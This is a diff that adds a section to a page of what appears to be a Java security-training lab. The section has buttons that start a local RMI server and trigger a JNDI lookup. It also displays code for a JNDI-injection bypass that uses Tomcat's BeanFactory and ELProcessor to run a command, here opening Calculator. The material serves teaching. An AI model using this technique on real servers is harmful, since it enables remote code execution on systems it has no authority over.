@@ -78,6 +78,46 @@ public void vul(String content) {
 }
                     </textarea>
 
+
+                    <br/><br/>
+
+                    <a style="float:right" class="btn btn-sm btn-danger"
+                       href="/JNDI/openrmibypass" target="_blank">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> 启动远程rmi服务</span></a>
+
+                    <a style="float:right" class="btn btn-sm btn-danger"
+                       href="/JNDI/vul2?content=rmi://127.0.0.1:2099/calc">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor"
+                             viewBox="0 0 16 16">
+                            <path d="m12.14 8.753-5.482 4.796c-.646.566-1.658.106-1.658-.753V3.204a1 1 0 0 1 1.659-.753l5.48 4.796a1 1 0 0 1 0 1.506z"/>
+                        </svg>
+                        <span class="align-middle"> Run</span></a>
+                    <h5><span class="lnr lnr-bug"> 漏洞代码 - ByPass</span></h5>
+
+                    <label for="code2"></label><textarea class="form-control" id="code5">
+// 因为要使用 javax.el.ELProcessor，所以需要 Tomcat 8+或SpringBoot 1.2.x+
+// 可以指定一个存在于目标 classpath 中的工厂类名称，交由这个工厂类去实例化实际的目标类(即引用所指向的类)，从而间接实现一定的代码控制
+
+void register() throws Exception {
+    try {
+        Registry registry = LocateRegistry.createRegistry(2099);
+        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
+        ref.add(new StringRefAddr("forceString", "x=eval"));
+        ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"open -a Calculator.app\")"));
+        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
+        registry.bind("calc", referenceWrapper);
+        System.out.println("Registry运行中......");
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+}
+                    </textarea>
+
+
                 </div>
 
                 <div class="float2">
